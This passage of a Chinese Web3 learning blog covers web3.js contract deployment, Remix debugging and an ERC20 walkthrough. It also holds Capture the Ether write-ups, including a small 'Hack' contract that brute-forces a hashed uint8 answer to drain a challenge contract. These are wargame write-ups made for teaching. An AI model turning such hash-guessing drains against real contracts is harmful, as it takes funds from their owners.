826101a3565b005b34801561009057600080fd5b506100996101a5565b6040516100a691906106a9565b60405180910390f35b3480156100bb57600080fd5b506100d660048036038101906100d1919061062f565b610237565b6040516100e391906106a9565b60405180910390f35b3480156100f857600080fd5b50610113600480360381019061010e919061062f565b6102b6565b005b60018054610122906107df565b80601f016020809104026020016040519081016040528092919081815260200182805461014e906107df565b801561019b5780601f106101705761010080835404028352916020019161019b565b820191906000526020600020905b81548152906001019060200180831161017e57829003601f168201915b505050505081565b565b6060600080546101b4906107df565b80601f01602080910402602001604051908101604052809291908181526020018280546101e0906107df565b801561022d5780601f106102025761010080835404028352916020019161022d565b820191906000526020600020905b81548152906001019060200180831161021057829003601f168201915b5050505050905090565b60607f52b54003f649c6d5ca97ae2b169c38f3c257eb14026ad745b11808153cdfd1528260405161026891906106a9565b60405180910390a16102af6040518060400160405280600581526020017f68656c6c6f000000000000000000000000000000000000000000000000000000815250836102d0565b9050919050565b80600090805190602001906102cc929190610524565b5050565b6060600083905060008390506000815183516102ec919061073d565b67ffffffffffffffff81111561032b577f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b6040519080825280601f01601f19166020018201604052801561035d5781602001600182028036833780820191505090505b50905060008190506000805b855181101561043d578581815181106103ab577f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b602001015160f81c60f81b8383806103c290610842565b9450815181106103fb577f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a905350808061043590610842565b915050610369565b5060005b845181101561051557848181518110610483577f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b602001015160f81c60f81b83838061049a90610842565b9450815181106104d3577f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a905350808061050d90610842565b915050610441565b50829550505050505092915050565b828054610530906107df565b90600052602060002090601f0160209004810192826105525760008555610599565b82601f1061056b57805160ff1916838001178555610599565b82800160010185558215610599579182015b8281111561059857825182559160200191906001019061057d565b5b5090506105a691906105aa565b5090565b5b808211156105c35760008160009055506001016105ab565b5090565b60006105da6105d5846106f0565b6106cb565b9050828152602081018484840111156105f257600080fd5b6105fd84828561079d565b509392505050565b600082601f83011261061657600080fd5b81356106268482602086016105c7565b91505092915050565b60006020828403121561064157600080fd5b600082013567ffffffffffffffff81111561065b57600080fd5b61066784828501610605565b91505092915050565b600061067b82610721565b610685818561072c565b93506106958185602086016107ac565b61069e81610918565b840191505092915050565b600060208201905081810360008301526106c38184610670565b905092915050565b60006106d56106e6565b90506106e18282610811565b919050565b6000604051905090565b600067ffffffffffffffff82111561070b5761070a6108e9565b5b61071482610918565b9050602081019050919050565b600081519050919050565b600082825260208201905092915050565b600061074882610793565b915061075383610793565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff038211156107885761078761088b565b5b828201905092915050565b6000819050919050565b82818337600083830152505050565b60005b838110156107ca5780820151818401526020810190506107af565b838111156107d9576000848401525b50505050565b600060028204905060018216806107f757607f821691505b6020821081141561080b5761080a6108ba565b5b50919050565b61081a82610918565b810181811067ffffffffffffffff82111715610839576108386108e9565b5b80604052505050565b600061084d82610793565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff8214156108805761087f61088b565b5b600182019050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b6000601f19601f830116905091905056fea2646970667358221220f839dcd300d8752d974808215c924e8e08a1d6556227d4be2b3c89805e41a38764736f6c63430008020033&quot;;myContract.deploy(&#123; data: data&#125;).send(&#123; from: &quot;0x3C061FCEb96fca484e8c55C204BAd35C6fE2CE0f&quot;, gas: 1500000, gasPrice: &#x27;1000000&#x27;&#125;,function(error,result)&#123; console.log(result)&#125;)// var contractAddress = &quot;&quot;;// var myContract = new web.eth.Contract(myContractABI,contractAddress); 报错： 原因：\\ 是一个特殊字符，即转义字符，需要 \\\\ 这样表示一个 \\ 执行结果： 这个结果是不正确的，没有给我们返回一个地址，解决办法是： 将 gasPrice 字段注释掉， 如 // gasPrice: &#39;1000000&#39; 再次执行其结果为： ① data 来源（需要在前面加一个0x）： 可以在 Ganache 上面查到 在vscode 部署的合约地址： 用这个合约地址到，remix 上验证一下： 13.3 调用合约函数13.3.1 调用智能合约读函数 代码： 1234567891011121314let Web3 = require(&quot;web3&quot;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));// fs 模块读取.sol合约文件var fs = require(&quot;fs&quot;);var myContractABI = JSON.parse(fs.readFileSync(&quot;D:\\\\VSCode\\\\VSCode_Data\\\\Web3Workspace\\\\js\\\\lesson_online\\\\MyContract.abi&quot;),toString());var myContract = new web.eth.Contract(myContractABI);var contractAddress = &quot;0x4c8BbD5829Bdcb9C9b11Ec3D5556cC77541FFB2e&quot;;var myContract = new web.eth.Contract(myContractABI,contractAddress);myContract.methods.getStorageValue().call((err,result)=&gt;&#123; console.log(result);&#125;); 结果： 13.3.2 调用智能合约写函数 代码： 12345678910111213141516171819let Web3 = require(&quot;web3&quot;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));// fs 模块读取.sol合约文件var fs = require(&quot;fs&quot;);var myContractABI = JSON.parse(fs.readFileSync(&quot;D:\\\\VSCode\\\\VSCode_Data\\\\Web3Workspace\\\\js\\\\lesson_online\\\\MyContract.abi&quot;),toString());var myContract = new web.eth.Contract(myContractABI);var contractAddress = &quot;0x4c8BbD5829Bdcb9C9b11Ec3D5556cC77541FFB2e&quot;;var myContract = new web.eth.Contract(myContractABI,contractAddress);myContract.methods.setStorageValue(&quot;new message&quot;).send(&#123; from: &quot;0x3C061FCEb96fca484e8c55C204BAd35C6fE2CE0f&quot;&#125;).on(&quot;receipt&quot;, function(result)&#123; console.log(result); myContract.methods.getStorageValue().call((err,result)=&gt;&#123; console.log(result); &#125;);&#125;); 13.4 调用合约事件13.4.1 合约事件监听 13.4.2 执行事件查询 14. 简单的DApp – 投票系统","categories":[{"name":"Web3","slug":"Web3","permalink":"https://biyouqiuqiu.com/categories/Web3/"},{"name":"Basic_Knowledge","slug":"Web3/Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Web3/Basic-Knowledge/"}],"tags":[{"name":"Web3","slug":"Web3","permalink":"https://biyouqiuqiu.com/tags/Web3/"}]},{"title":"Remix-debug的使用","slug":"Solidity/Basic_Knowledge/Remix-debug的使用","date":"2023-03-31T06:47:10.000Z","updated":"2023-03-31T06:47:10.000Z","comments":true,"path":"2023/03/31/Solidity/Basic_Knowledge/Remix-debug的使用/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/31/Solidity/Basic_Knowledge/Remix-debug%E7%9A%84%E4%BD%BF%E7%94%A8/","excerpt":"","text":"Remix-debug的使用参考博客官方文档1官方文档21. 参考博客中获取的测试代码：1234567891011121314151617181920212223// SPDX-License-Identifier: MITpragma solidity ^0.8.4;contract Debugging &#123; uint256 counter; constructor(uint256 _counter) &#123; counter = _counter; &#125; function _setCounter(uint256 _counter) internal &#123; counter = _counter; &#125; function increment(uint256 value) public &#123; uint256 newValue = counter + value; _setCounter(newValue); &#125; function decrement(uint256 value) public &#123; uint256 newValue = counter - value; _setCounter(newValue); &#125; function getCounter() public view returns(uint256) &#123; return counter; &#125;&#125; 2. 编译部署 3. 调用 increment 函数 4. 调试智能合约 4.1 先找到交易的hash值：0xe19af7a3be310b85ccfb9538ef16314a575f395aae3787f71f897b4845547885 4.2 将交易的哈希填入，debug 的参数框内，点击 Start debugging 4.3 了解各个按钮的意思 ① 返回到上一个步骤。函数调用将被忽略，调试器将不进入该函数。 ② 后退一步回到上一步。函数不会被忽略，调试器将进入该函数。 ③ Step into进入下一步，如果有函数调用，调试器将进入函数。 ④ 跨步前进进入下一步，但是函数调用将被忽略，调试器不会进入函数。 ⑤ 跳到上一个断点，使调试器进入最后访问的断点。可以通过点击代码的行号来设置断点 ⑥ 跳出将调试器带到函数的末端 ⑦ 跳到下一个断点会使调试器跳到编辑器中的下一个设定的断点。 还有一个是滑块，类似于进度条 4.4 刚开始调试的时候，increment() 函数体中的某些变量是高亮的，比如newValue 这个变量正在被创建。一直往下调试的时候，counter 和 value 的也会高亮显示，模拟了加法的工作情况 4.5 最终，在后几步， Solidity Locals 面板上这样显示 这意味着 newValue 当前的值是520。再继续往后走, _setCounter 函数将会高亮，意味着 控制被传递到内部函数 _setCounter ，此时 debug 将不能继续往下走了，表示该方法已经运行完成 4.6 可以观察到 Solidity State 中的 counter 的值已经发生了更新 5. 其他调试功能5.1 函数栈 这个面板可以得到很多信息，比如哪个函数目前正在执行，哪个函数调用了它。如果有多个函数，它将以堆栈的形式显示。 5.2 全局变量 可以跟踪交易中的全局变量，以备你需要知道交易中的发件人或其他数据 5.3 步骤细节 可以得到一些额外的步骤数据，如已使用的gas 和 剩余的 gas 5.4 操作码 使用操作码，可以得到关于合同当前步骤的高级信息。你可以了解程序何时执行步骤，如 JUMP （？？？？）。 内心：此时的我内心还是很懵逼的，道理都懂，但是其中的细节还是不懂，为什么下一步可以点那么那么多下，之前学 Java 的时候，使用 Idea debug调试代码，好像都不需要点这么多下，可能得多用吧，多练多用","categories":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/categories/Solidity/"},{"name":"Utils","slug":"Solidity/Utils","permalink":"https://biyouqiuqiu.com/categories/Solidity/Utils/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://biyouqiuqiu.com/tags/solidity/"},{"name":"Remix-debug","slug":"Remix-debug","permalink":"https://biyouqiuqiu.com/tags/Remix-debug/"}]},{"title":"ERC20的理解","slug":"Solidity/Basic_Knowledge/ERC20的理解","date":"2023-03-30T22:47:10.000Z","updated":"2023-03-30T22:47:10.000Z","comments":true,"path":"2023/03/31/Solidity/Basic_Knowledge/ERC20的理解/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/31/Solidity/Basic_Knowledge/ERC20%E7%9A%84%E7%90%86%E8%A7%A3/","excerpt":"","text":"ERC20的理解知识来源： 文章一 文章二 文章三 官方文档 1. 文章一的解读：1. 1 ERC20ERC20 是以太坊上的代币标准，来自 EIP20 。它实现了代币转账的基本逻辑： 账户余额 转账 授权转账 代币总供给 代币信息(可选)：名称，代号，小数位数 1.2 IERC20IERC20 是 ERC20 代币标准的接口合约，规定了ERC20 代币需要实习的函数和事件。之所以需要定义接口，是因为有了规范后，就存在所有的 ERC20 代币都通用的函数名称，输入参数，输出参数。在接口函数中，只需要定义函数名称，输入参数，输出参数，并不关心函数内部如何实现。由此，函数就分为内部和外部两个内容，一个重点是实现，另一个是对外接口，约定公共数据。这就是为什么需要ERC20。sol 和 IERC20.sol 两个文件实现一个合约。 1.2.1 事件IERC20 定义了 2 个事件：Transfer 事件 和 Approval 事件，分别在转账时被释放 123456789/** * @dev 释放条件：当 `value` 单位的货币从账户 (`from`) 转账到另一账户 (`to`)时. */event Transfer(address indexed from, address indexed to, uint256 value);/** * @dev 释放条件：当 `value` 单位的货币从账户 (`owner`) 授权给另一账户 (`spender`)时. */event Approval(address indexed owner, address indexed spender, uint256 value); 1.2.2 函数IERC20 定义了 6 个函数，提供了转移代币的基本功能，并允许代币获得批准，以便其他链上第三方使用。 totalSupply() 返回代币总供给 1234/** * @dev 返回代币总供给. */function totalSupply() external view returns (uint256); balanceOf() 返回账户余额 1234/** * @dev 返回账户`account`所持有的代币数. */function balanceOf(address account) external view returns (uint256); transfer() 转账 12345678/** * @dev 转账 `amount` 单位代币，从调用者账户到另一账户 `to`. * * 如果成功，返回 `true`. * * 释放 &#123;Transfer&#125; 事件. */function transfer(address to, uint256 amount) external returns (bool); allowance() 返回授权额度 123456/** * @dev 返回`owner`账户授权给`spender`账户的额度，默认为0。 * * 当&#123;approve&#125; 或 &#123;transferFrom&#125; 被调用时，`allowance`会改变. */function allowance(address owner, address spender) external view returns (uint256); approve() 授权 12345678/** * @dev 调用者账户给`spender`账户授权 `amount`数量代币。 * * 如果成功，返回 `true`. * * 释放 &#123;Approval&#125; 事件. */function approve(address spender, uint256 amount) external returns (bool); tranferFrom() 授权转账 123456789101112/** * @dev 通过授权机制，从`from`账户向`to`账户转账`amount`数量代币。转账的部分会从调用者的`allowance`中扣除。 * * 如果成功，返回 `true`. * * 释放 &#123;Transfer&#125; 事件. */function transferFrom( address from, address to, uint256 amount) external returns (bool); 1.3 实现ERC20​ 自己编写一个ERC20, 将IERC20 规定的函数简单的实现。 1.3.1 状态变量我们需要状态变量来记录账户余额，授权额度和代币信息。其中balanceOf，allowance 和 totalSupply 为public 类型， 会自动生成一个同名的getter 函数，实现 IERC20 规定的 balanceOf() ， allowance() 和 totalSupply() 。而 name，symbol，decimals 则对应代币的名称，代号和小数位数。 注意：用 override修饰 public变量，会重写继承父合约的与变量名同名的getter函数，比如 IERC20中的 balanceOf（） 函数 12345678910mapping(address =&gt; uint256) public override balanceOf;mapping(address =&gt; mapping(address =&gt; uint256)) public override allowance;uint256 public override totalSupply; // 代币总供给string public name; // 名称string public symbol; // 代号uint8 public decimals = 18; // 小数位数 解读：嵌套映射 mapping(address =&gt; mapping(address =&gt; uint256)) public override allowance; 我的理解是先执行内层的 mapping 映射，得到内层 address 地址，对应的 uint256 的值，然后再执行外层 mapping 外层的address 对应了内层 address 映射出的值，有点像 Java 里的键值对，两个address 唯一确定一个uint256？我目前的理解是这样，日后等我知识储备多一点我再来解决这里的疑惑 1.3.2 函数 构造函数：初始化代币名称、代号。 1234constructor(string memory name_, string memory symbol_)&#123; name = name_; symbol = symbol_;&#125; transfer() 函数：实现 IERC20 中的 transfer 函数，代币转账逻辑。调用方扣除 amount 数量代币， 接收方增加相应的代币。（土狗币会魔改这个函数，加入税收、分红、抽奖等逻辑）– (⊙﹏⊙)我不理解这个是什么 123456function transfer(address recipient, uint amount) external override returns (bool) &#123; balanceOf[msg.sender] -= amount; balanceOf[recipient] += amount; emit Transfer(msg.sender, recipient, amount); return true;&#125; approve() 函数：实现IERC20 中的 approve 函数，代币授权逻辑。被接收方 spender 可以支配授权方的 amount 数量的代币。spender 可以是 EOA 账户，也可以是合约账户：当你使用 uniswap 交易代币时，你需要 将代币授权给 uniswap 合约。 12345function approve(address spender, uint amount) external override returns (bool) &#123; allowance[msg.sender][spender] = amount; emit Approval(msg.sender, spender, amount); return true;&#125; transferFrom()函数： 实现了IERC20 中的 transferFrom 函数，授权转账逻辑。被接收方将授权方sender的amount 数量的代币转账给接收方 recipient。 1234567891011function transferFrom( address sender, address recipient, uint amount) external override returns (bool) &#123; allowance[sender][msg.sender] -= amount; balanceOf[sender] -= amount; balanceOf[recipient] += amount; emit Transfer(sender, recipient, amount); return true;&#125; mint() 函数：铸造代币函数，不在 IERC20 标准中。这里为了教程方便，任何人可以铸造任意数量的代币，实现应用中会加权限管理，只用 owner 可以铸造代币： 12345function mint(uint amount) external &#123; balanceOf[msg.sender] += amount; totalSupply += amount; emit Transfer(address(0), msg.sender, amount);&#125; burn() 函数：销毁代币函数，不在IERC20 标准中。 12345function burn(uint amount) external &#123; balanceOf[msg.sender] -= amount; totalSupply -= amount; emit Transfer(msg.sender, address(0), amount);&#125; 1.4 在 Remix 上，发行 ERC20 代币网页版的 Remix 经常会出现 bug 的，我刚刚就是一直卡在编译不通过那里，过了一会就可以编译通过了，有两种导入 IERC20 的方式，①直接从网上导入不过这个对网络的要求比较高，网络不好就贵给你报错；② 将网上的 IERC20 源码复制下来，新建一个同名的合约，直接相对路径导入就可以了，即 import &quot;./IERC20.sol&quot;; 1.4.1 在Remix 上编译部署 在Remix上编译好ERC20合约，在部署栏输入构造函数的参数，name_和symbol_都设为biyou，然后点击transact键进行部署。 这样，我们就创建好了WTF代币。我们需要运行mint()函数来给自己铸造一些代币。点开Deployed Contract中的ERC20合约，在mint函数那一栏输入100并点击mint按钮，为自己铸造100个WTF代币 最后通过调用 balanceOf函数，将我的测试地址作为参数，传入并查询我的余额，如显示为100，则成功 IERC20.sol： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778// SPDX-License-Identifier: MIT// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)pragma solidity ^0.8.0;/** * @dev Interface of the ERC20 standard as defined in the EIP. */interface IERC20 &#123; /** * @dev Emitted when `value` tokens are moved from one account (`from`) to * another (`to`). * * Note that `value` may be zero. */ event Transfer(address indexed from, address indexed to, uint256 value); /** * @dev Emitted when the allowance of a `spender` for an `owner` is set by * a call to &#123;approve&#125;. `value` is the new allowance. */ event Approval(address indexed owner, address indexed spender, uint256 value); /** * @dev Returns the amount of tokens in existence. */ function totalSupply() external view returns (uint256); /** * @dev Returns the amount of tokens owned by `account`. */ function balanceOf(address account) external view returns (uint256); /** * @dev Moves `amount` tokens from the caller&#x27;s account to `to`. * * Returns a boolean value indicating whether the operation succeeded. * * Emits a &#123;Transfer&#125; event. */ function transfer(address to, uint256 amount) external returns (bool); /** * @dev Returns the remaining number of tokens that `spender` will be * allowed to spend on behalf of `owner` through &#123;transferFrom&#125;. This is * zero by default. * * This value changes when &#123;approve&#125; or &#123;transferFrom&#125; are called. */ function allowance(address owner, address spender) external view returns (uint256); /** * @dev Sets `amount` as the allowance of `spender` over the caller&#x27;s tokens. * * Returns a boolean value indicating whether the operation succeeded. * * IMPORTANT: Beware that changing an allowance with this method brings the risk * that someone may use both the old and the new allowance by unfortunate * transaction ordering. One possible solution to mitigate this race * condition is to first reduce the spender&#x27;s allowance to 0 and set the * desired value afterwards: * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729 * * Emits an &#123;Approval&#125; event. */ function approve(address spender, uint256 amount) external returns (bool); /** * @dev Moves `amount` tokens from `from` to `to` using the * allowance mechanism. `amount` is then deducted from the caller&#x27;s * allowance. * * Returns a boolean value indicating whether the operation succeeded. * * Emits a &#123;Transfer&#125; event. */ function transferFrom(address from, address to, uint256 amount) external returns (bool);&#125; ERC20_self.sol 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162// SPDX-License-Identifier: MITpragma solidity ^0.8.4;// import &quot;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/IERC20.sol&quot;;import &quot;./IERC20.sol&quot;;contract ERC20_self is IERC20 &#123; mapping(address =&gt; uint256) public override balanceOf; mapping(address =&gt; mapping(address =&gt; uint256)) public override allowance; uint256 public override totalSupply; // 代币总供给 string public name; // 名称 string public symbol; // 代号 uint8 public decimals = 18; // 小数位数 constructor(string memory name_, string memory symbol_)&#123; name = name_; symbol = symbol_; &#125; function transfer(address recipient, uint amount) external override returns (bool) &#123; balanceOf[msg.sender] -= amount; balanceOf[recipient] += amount; emit Transfer(msg.sender, recipient, amount); return true; &#125; function approve(address spender, uint amount) external override returns (bool) &#123; allowance[msg.sender][spender] = amount; emit Approval(msg.sender, spender, amount); return true; &#125; function transferFrom( address sender, address recipient, uint amount ) external override returns (bool) &#123; allowance[sender][msg.sender] -= amount; balanceOf[sender] -= amount; balanceOf[recipient] += amount; emit Transfer(sender, recipient, amount); return true; &#125; function mint(uint amount) external &#123; balanceOf[msg.sender] += amount; totalSupply += amount; emit Transfer(address(0), msg.sender, amount); &#125; function burn(uint amount) external &#123; balanceOf[msg.sender] -= amount; totalSupply -= amount; emit Transfer(msg.sender, address(0), amount); &#125;&#125; 2. 文章二解读：2.1 简介 简单总结：是一个 Token 的标准接口 摘要：此标准允许在智能合约为token实现标准API。 本标准提供了转移token的基本功能，并允许链上第三方使用token 目的：标准接口可以让以太网上的任何token被其他应用程序重新使用：从钱包到去中心化的交易所 2.2 详细解读 变量、函数及事件 name: 返回令牌的名字，例如“MyToken” 1function name() view returns (string name) symbol：返回令牌的符号，比如￥ 1function symbol() constant returns (string symbol) decimals：返回token使用的小数点后几位， 比如 8，表示将1个token数量分为100000000份 1function decimals() view returns (uint8 decimals) totalSupply：返回token的总供应量 1function totalSupply() constant returns (uint256 totalSupply) balanceOf：返回地址_owner的账户余额 1function balanceOf(address _owner) constant returns (uint256 balance) transfer：转移_value数量的token到地址_to，并且必须触发Transfer事件。 如果_from帐户余额没有足够的token来支出，该方法应该抛出异常。注意：_value&#x3D;0必须被视为正常转移并触发Transfer事件 1function transfer(address _to, uint256 _value) returns (bool success) transferFrom：从地址_from发送_value个token到地址_to，必须触发Transfer事件。transferFrom方法用于提现流程，允许合约为你转移token。这可以用于允许合约为你转让代币或收取费用。除了_from帐户通过某种机制授权消息的发送者之外，否则该方法应该抛出异常。注意：_value&#x3D;0须被视为正常转移并触发Transfer事件 1function transferFrom(address _from, address _to, uint256 _value) returns (bool success) approve：允许_spender多次从你的帐户提现，最高数量是_value。 如果再次调用此函数，它将以_value覆盖当前的值。注意：为了防止向量攻击，客户端需要确认以这样的方式创建用户接口，即在为同一个花费者设置另一个值之前，先将它的值设置为0。虽然合约本身不应该强制执行，以前部署的合同允许向后兼容 1function approve(address _spender, uint256 _value) returns (bool success) allowance：返回被允许从_owner提取到_spender余额 1function allowance(address _owner, address _spender) constant returns (uint256 remaining) 事件： Transfer：当token被转移(即使是0值)时必须被触发 1event Transfer(address indexed _from, address indexed _to, uint256 _value) Approval：当成功调用approve(address _spender, uint256 _value)后必须被触发 1event Approval(address indexed _owner, address indexed _spender, uint256 _value) 3.文章三解读：ERC-20 标准以太坊上的一个代币协议，所有基于以太坊开发的代币合约都遵守这个协议。 3.1 协议中包含的方法：123456789101112131415161718192021222324252627282930313233343536//1.name//返回string类型的ERC20代币的名字，例如：StatusNetworkfunction name() constant returns (string name) //2.symbol//返回string类型的ERC20代币的符号，也就是代币的简称，例如：SNTfunction name() constant returns (string name) //3.decimals//支持几位小数点后几位。如果设置为3。也就是支持0.001表示。function symbol() constant returns (string symbol)//4.totalSupply//发行代币的总量，可以通过这个函数来获取。所有智能合约发行的代币总量是一定的，totalSupply必须设置初始值。如果不设置初始值，这个代币发行就说明有问题。function totalSupply() constant returns (uint256 totalSupply)//5.balanceOf//输入地址，可以获取该地址代币的余额。function balanceOf(address _owner) constant returns (uint256 balance)//6.transfer//调用transfer函数将自己的token转账给_to地址，_value为转账个数function transfer(address _to, uint256 _value) returns (bool success)//7.approve//批准_spender账户从自己的账户转移_value个token。可以分多次转移。function approve(address _spender, uint256 _value) returns (bool success)//8.transferFrom//与approve搭配使用，approve批准之后，调用transferFrom函数来转移token。function transferFrom(address _from, address _to, uint256 _value) returns (bool success)//9.allowance//返回_spender仍然允许从_owner提取的金额。function allowance(address _owner, address _spender) constant returns (uint256 remaining) 4.2 协议中包含的事件：12345678//1.Transfer//在发生代币转移时必须触发，包括生成新代币event Transfer(address indexed _from, address indexed _to, uint256 _value)//2.Approval//成功调用approve(address _spender, uint256 _value)方法时触发event Approval(address indexed _owner, address indexed _spender, uint256 _value) 4.3 例子：账户A有1000个ETH，想允许B账户随意调用100个ETH A账户按照以下形式调用approve函数approve(B,100) 当B账户想用这100个ETH中的10个ETH给C账户时，则调用transferFrom(A, C, 10) 这时调用allowance(A, B)，可以查看B账户还能够调用A账户多少个token。 这个理解，我感觉还是比较容易理解allowance的： 这时调用allowance(A, B)，可以查看 B账户还能够调用 A账户多少个token","categories":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/categories/Solidity/"},{"name":"Basic_Knowledge","slug":"Solidity/Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Solidity/Basic-Knowledge/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://biyouqiuqiu.com/tags/solidity/"},{"name":"ERC20","slug":"ERC20","permalink":"https://biyouqiuqiu.com/tags/ERC20/"}]},{"title":"Guess the secret number","slug":"Smart contracts/capther the ether/Guess the secret number","date":"2023-03-20T04:47:10.000Z","updated":"2023-03-20T04:47:10.000Z","comments":true,"path":"2023/03/20/Smart contracts/capther the ether/Guess the secret number/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/20/Smart%20contracts/capther%20the%20ether/Guess%20the%20secret%20number/","excerpt":"","text":"Guess the secret number1. 题目 1.1 Putting the answer in the code makes things a little too easy. This time I’ve only stored the hash of the number. Good luck reversing a cryptographic hash! 1.2 题目代码： 12345678910111213141516171819202122// SPDX-License-Identifier: MITpragma solidity ^0.4.21;contract GuessTheSecretNumberChallenge &#123; bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365; function GuessTheSecretNumberChallenge() public payable &#123; require(msg.value == 1 ether); &#125; function isComplete() public view returns (bool) &#123; return address(this).balance == 0; &#125; function guess(uint8 n) public payable &#123; require(msg.value == 1 ether); if (keccak256(n) == answerHash) &#123; msg.sender.transfer(2 ether); &#125; &#125;&#125; 2. 分析 2.1 这是我第一次感觉自己能想出来的题目了。。。。 2.2 反正 uint8 的范围是 0-256 嘛，直接 循环一个一个蛮力法，一个一个试出来 2.3 写一个Hack 合约来计算，哈希值为 ：0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365 的数字 Hack 合约代码： 1234567891011121314contract Hack &#123; uint8 public number; bytes32 answer = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365; function f() public returns(uint8) &#123; for (uint8 i = 0; i &lt;= 256; i++) &#123; if (keccak256(i) == answer) &#123; number = i; break; &#125; &#125; return number; &#125;&#125; 运行求出来的结果是 ：170 3. 解题 3.1 部署合约 3.2 将 170 作为参数，调用guss() 函数 3.3 同时前两步操作都需要将 msg.value 设置为 1 ether","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"capther the ether","slug":"Smart-contracts/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/capther-the-ether/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Guess the number","slug":"Smart contracts/capther the ether/Guess the number","date":"2023-03-20T04:39:10.000Z","updated":"2023-03-20T04:39:10.000Z","comments":true,"path":"2023/03/20/Smart contracts/capther the ether/Guess the number/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/20/Smart%20contracts/capther%20the%20ether/Guess%20the%20number/","excerpt":"","text":"Guess the number1. 题目 I’m thinking of a number. All you have to do is guess it. 题目代码： 12345678910111213141516171819202122// SPDX-License-Identifier: MITpragma solidity ^0.4.21;contract GuessTheNumberChallenge &#123; uint8 answer = 42; function GuessTheNumberChallenge() public payable &#123; require(msg.value == 1 ether); &#125; function isComplete() public view returns (bool) &#123; return address(this).balance == 0; &#125; function guess(uint8 n) public payable &#123; require(msg.value == 1 ether); if (n == answer) &#123; msg.sender.transfer(2 ether); &#125; &#125;&#125; 2. 分析 2.1 这题是猜数字，但是他的数字是写死的，即42 。我们直接猜42 就好了 2.2 但是部署和 猜数字都需要支付 1ether ，即两个，如果猜对了他就会返回之前支付的ether 3. 解题 3.1 部署，msg.value &#x3D; 1 ether 3.2 调用 guss() 函数 3.3 查看合约余额","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"capther the ether","slug":"Smart-contracts/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/capther-the-ether/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Choose a nickname","slug":"Smart contracts/capther the ether/Choose a nickname","date":"2023-03-20T02:39:10.000Z","updated":"2023-03-20T02:39:10.000Z","comments":true,"path":"2023/03/20/Smart contracts/capther the ether/Choose a nickname/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/20/Smart%20contracts/capther%20the%20ether/Choose%20a%20nickname/","excerpt":"","text":"Choose a nickname1. 题目 1.1 智能合约CaptureTheEther会记录每个玩家的昵称。要完成此挑战，请将您的昵称设置为非空字符串。智能合约在地址 的 Ropsten 测试网络上运行0x71c46Ed333C35e4E6c62D32dc7C8F00D125b4fee。 1.2 题目代码 123456789101112131415161718192021222324252627282930// SPDX-License-Identifier: MITpragma solidity ^0.4.21;// Relevant part of the CaptureTheEther contract.contract CaptureTheEther &#123; mapping (address =&gt; bytes32) public nicknameOf; function setNickname(bytes32 nickname) public &#123; nicknameOf[msg.sender] = nickname; &#125;&#125;// Challenge contract. You don&#x27;t need to do anything with this; it just verifies// that you set a nickname for yourself.contract NicknameChallenge &#123; CaptureTheEther cte = CaptureTheEther(msg.sender); address player; // Your address gets passed in as a constructor parameter. function NicknameChallenge(address _player) public &#123; player = _player; &#125; // Check that the first character is not null. function isComplete() public view returns (bool) &#123; return cte.nicknameOf(player)[0] != 0; &#125;&#125; 2. 分析 2.1 只需要将成功调用setNickname() 函数即可 2.2 考点在于如何将字符串转为64位 16进制的数据类型 我在idea 编写了一个程序来解决这个问题 123456789101112131415161718192021222324252627282930313233package daily_temp;/** * @Auther: 柚子 * @Date:2023/3/24年03月24日 15:43 * @Description:daily_temp * @version: 1.0 */public class convertStringToHex &#123; public static void main(String[] args) &#123; covertStringToHex(&quot;biyou&quot;); &#125; static void covertStringToHex(String str) &#123; StringBuffer sb = new StringBuffer(); char[] chars = str.toCharArray(); for(char c : 